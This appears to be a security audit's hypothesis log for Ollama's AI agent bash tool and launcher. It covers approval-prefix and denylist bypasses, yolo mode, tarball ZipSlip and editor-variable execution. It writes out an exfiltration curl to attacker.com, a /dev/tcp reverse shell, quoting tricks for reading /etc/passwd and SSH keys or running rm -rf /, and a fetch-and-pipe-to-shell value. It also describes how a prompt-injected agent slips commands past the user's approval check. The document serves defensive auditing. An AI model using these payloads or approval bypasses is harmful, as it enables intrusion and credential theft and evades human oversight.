# Round 1 Hypotheses — Backward Reasoner (Pre-Mortem / Abductive)

## PH-01: Shell Metacharacter Injection via Approved Prefix — Full RCE

**Reasoning model**: Backward (Pre-Mortem)
**Status**: VALIDATED

Working backward from the sink `exec.CommandContext(ctx, "bash", "-c", command)` at `x/tools/bash.go:64`:

For arbitrary code execution the attacker needs to supply a `command` string that:
1. Passes `IsDenied` (or is not in the denylist), AND
2. Either is in the allowlist already, OR the LLM can get the user to approve a benign-looking first command that sets a prefix.

**Attack**: User approves `cat tools/README.md` (reasonable for a coding assistant). This stores `cat:tools/` in the prefix allowlist. The LLM then generates:
```
cat tools/README.md ; curl -s http://attacker.com/$(id | base64) > /dev/null
```
- `extractBashPrefix` sees `cat tools/README.md`, produces prefix `cat:tools/`, matches stored prefix.
- `IsDenied` sees no denied substring (`curl -d` would be denied but `curl -s` is not).
- Command is approved automatically. Full network exfiltration.

**Variant**: `cat tools/x && bash -i >& /dev/tcp/10.0.0.1/4444 0>&1`
- `IsDenied` checks for `nc `, `netcat `, but not `bash -i >&`.
- Prefix `cat:tools/` matches. Shell spawned.

**Code path**: `x/cmd/run.go:404` → `approval.IsAllowed` → `extractBashPrefix` (approval.go:204) → match → `x/tools/bash.go:64`
**Sanitizers on path**: `IsDenied` substring check — bypassable by not using listed substrings; `extractBashPrefix` prefix match — only checks first pipe-segment, ignores `;`/`&&`/`||`/command-substitution
**Consequence**: Arbitrary code execution as the user running ollama, post single legitimate approval
**Severity**: CRITICAL

---

## PH-02: Denylist Substring Bypass via Bash Quoting — Blocked Commands Unblocked

**Reasoning model**: Backward (Abductive)
**Status**: VALIDATED

`IsDenied` calls `strings.Contains(commandLower, strings.ToLower(pattern))`. The patterns include `/etc/passwd`, `.ssh/id_rsa`, `rm -rf`, etc.

Bash evaluates the string it receives from `-c` with full quote/expansion processing BEFORE opening files. Therefore:

- `/e''tc/passwd` → bash produces `/etc/passwd`, IsDenied sees `/e''tc/passwd` — NO MATCH
- `$'\x2fetc\x2fpasswd'` → bash produces `/etc/passwd`, IsDenied sees `$'\x2fetc\x2fpasswd'` — NO MATCH
- `r''m -rf /` → bash produces `rm -rf /`, IsDenied sees `r''m -rf /` — NO MATCH for `rm -rf`
- `cat $HOME/.ssh/id''_rsa` → IsDenied checks `.ssh/id_rsa`, sees `.ssh/id''_rsa` — NO MATCH

**Code path**: `x/cmd/run.go:378` → `agent.IsDenied(cmd)` → `approval.go:179` → returns false → execution proceeds
**Sanitizers on path**: `IsDenied` — bypassable as demonstrated; `extractBashPrefix` — irrelevant since the command still goes to approval/yolo
**Consequence**: Commands explicitly on the deny list execute anyway via trivial quoting; false assurance that dangerous commands are blocked
**Severity**: HIGH (the denylist is the last-resort safety net; it fails completely against any quoting variant)

---

## PH-03: Multi-Argument Bypass — Second Path Arg Escapes Approved Directory

**Reasoning model**: Backward
**Status**: VALIDATED

`extractBashPrefix` iterates `fields[1:]` and returns on the FIRST path-like argument. Subsequent arguments are passed to bash but ignored by the approval check.

```
cat tools/file.go /etc/hosts
```
- `extractBashPrefix`: sees `tools/file.go`, returns `cat:tools/`
- `IsDenied`: `/etc/hosts` not in denyPathPatterns (only `/etc/passwd` and `/etc/shadow` are)
- Approved, bash runs: reads both files, outputs `/etc/hosts` contents to LLM

```
cat tools/file.go ~/.aws/credentials
```
- `extractBashPrefix`: returns `cat:tools/`
- `IsDenied`: `.aws/credentials` is in denyPathPatterns — this one IS caught
- BLOCKED

```
cat tools/file.go ~/.config/gh/hosts.yml
```
- `extractBashPrefix`: returns `cat:tools/`
- `IsDenied`: no match — NOT blocked
- APPROVED, github token exfiltrated

**Code path**: `x/agent/approval.go:231-285` (extractBashPrefix returns on first path arg) → `approval.IsAllowed` passes → `bash.go:64`
**Sanitizers on path**: denyPathPatterns catches some sensitive paths but not all; approval only covers first path arg
**Consequence**: LLM reads arbitrary files by appending them as secondary args to approved commands
**Severity**: HIGH

---

## PH-04: Yolo Mode — Total Approval Bypass Including Denylist

**Reasoning model**: Abductive
**Status**: VALIDATED

`x/cmd/run.go:400-403`:
```go
if opts.YoloMode {
    if !skipApproval {
        fmt.Fprintf(os.Stderr, "\033[1mrunning:\033[0m %s\n", ...)
    }
```

In yolo mode the entire `IsDenied` + `IsAllowed` + `RequestApproval` chain is skipped. `IsDenied` is checked BEFORE the yolo branch at line 378, BUT examining the flow:

```go
if toolName == "bash" {
    if cmd, ok := args["command"].(string); ok {
        if denied, pattern := agent.IsDenied(cmd); denied {
            ...continue...  // still fires in yolo mode
        }
        // auto-allow check (commented out)
    }
}
// Check approval (yolo mode)
if opts.YoloMode {
    fmt.Fprintf(os.Stderr, "running: ...")
    // NO approval check, execution continues
```

Actually `IsDenied` IS evaluated and blocks even in yolo mode (lines 376-387 run before the yolo check at 400). However, the denylist bypass from PH-02 still applies — yolo + quoting bypass = zero friction full RCE.

The more dangerous aspect: yolo mode is exposed as `--experimental-yolo` on `ollama run`. A user misled by the "experimental" label may not understand they have disabled all security for the session. An attacker who can influence the launch invocation (e.g., shell alias, `.envrc`, PATH manipulation) enables full RCE with zero per-command friction.

**Code path**: `cmd/cmd.go:2161` (flag definition) → `cmd/cmd.go:733` → `x/cmd/run.go:665,718`
**Sanitizers on path**: IsDenied still runs; bypassable as per PH-02
**Consequence**: All LLM-requested tool calls execute without user confirmation; combined with PH-02 quoting bypass = immediate arbitrary code execution
**Severity**: CRITICAL (escalates any prompt-injection to immediate RCE)

---

## PH-05: ZipSlip via Malicious npm Tarball in ensureWebSearchPlugin

**Reasoning model**: Backward (Pre-Mortem)
**Status**: VALIDATED

`cmd/launch/openclaw.go:771-786`:
```go
pack := exec.Command(npmBin, "pack", webSearchNpmPackage, "--pack-destination", pluginDir)
out, err := pack.Output()
tgzName := strings.TrimSpace(string(out))
tgzPath := filepath.Join(pluginDir, tgzName)
defer os.Remove(tgzPath)

tar := exec.Command("tar", "xzf", tgzPath, "--strip-components=1", "-C", pluginDir)
```

Attack vectors:
1. **npm package compromise** (`@ollama/openclaw-web-search`): A compromised version on npm registry ships a tarball with entries like `../../../.ssh/authorized_keys` or `../../../.bashrc`. `tar` with `--strip-components=1` strips the first path component, so `package/../../../.ssh/authorized_keys` becomes `../../.ssh/authorized_keys` relative to `-C pluginDir`. This writes attacker-controlled content into `~/.ssh/authorized_keys`.
2. **tgzName injection**: `npm pack` stdout is used directly as `tgzName`. If stdout contains a newline or path separator, `filepath.Join(pluginDir, tgzName)` may point outside `pluginDir`. E.g., `stdout = "../../evil\n"` → `tgzPath = "~/.openclaw/extensions/../../evil"` → attacker-controlled tar path.
3. **No integrity check**: There is no hash/signature verification of the downloaded tarball before extraction.

**Code path**: `openclaw.go:771` (`npm pack`) → `:779` (tgzName from stdout) → `:782` (`tar xzf`) → filesystem write
**Sanitizers on path**: None. No digest check, no path filtering of tar entries, no containment validation.
**Consequence**: Arbitrary file write as the user running ollama launch openclaw. Can overwrite `~/.ssh/authorized_keys`, `~/.bashrc`, `~/.zprofile`, `~/.profile`, or any other file writable by the user. Leads to persistent RCE.
**Severity**: CRITICAL (supply chain attack surface; ZipSlip to persistent RCE)

---

## PH-06: $VISUAL/$EDITOR Arbitrary Binary Execution

**Reasoning model**: Abductive
**Status**: VALIDATED

`cmd/interactive.go:643-677`:
```go
editor := envconfig.Editor()      // OLLAMA_EDITOR
if editor == "" { editor = os.Getenv("VISUAL") }
if editor == "" { editor = os.Getenv("EDITOR") }
...
args := strings.Fields(editor)
args = append(args, tmpFile.Name())
cmd := exec.Command(args[0], args[1:]...)
```

`strings.Fields` splits on whitespace. If `VISUAL="/bin/sh -c 'curl http://evil|sh' #"`, then:
- `args[0]` = `/bin/sh`
- `args[1]` = `-c`
- `args[2]` = `curl http://evil|sh`
- `args[3]` = `#` (comments out tmpFile.Name)
- exec.Command runs an arbitrary shell command

An attacker controlling the environment (`.envrc`, `~/.bashrc`, CI/CD secrets leak, shared system with custom environment) sets `EDITOR` or `VISUAL` to an attacker binary, then triggers Ctrl+G in ollama interactive mode to invoke `editInExternalEditor`.

The `exec.LookPath(name)` check at line 657 only verifies the binary exists, not that it is safe.

**Code path**: `cmd/interactive.go:644-677` (env read + exec.Command)
**Sanitizers on path**: `exec.LookPath` existence check only; no allowlist, no path restriction
**Consequence**: Arbitrary binary execution with user's permissions when Ctrl+G is pressed in interactive mode
**Severity**: HIGH (requires env-level attacker; trigger is interactive)
